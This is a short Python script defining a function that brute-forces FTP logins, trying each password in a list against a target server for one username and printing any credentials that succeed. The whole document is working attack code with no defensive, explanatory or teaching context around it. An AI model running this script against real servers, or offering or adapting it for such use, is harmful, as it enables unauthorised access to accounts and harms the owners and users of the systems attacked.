import ftplib

def ftp_brute_force(target, username, password_list):
    print(f"Starting FTP brute-force on {target} with user '{username}'")
    for password in password_list:
        try:
            with ftplib.FTP(target) as ftp:
                ftp.login(user=username, passwd=password)
                print(f"[+] Success: {username}:{password}")
                return
        except ftplib.error_perm:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
    print("[-] Brute force failed.")
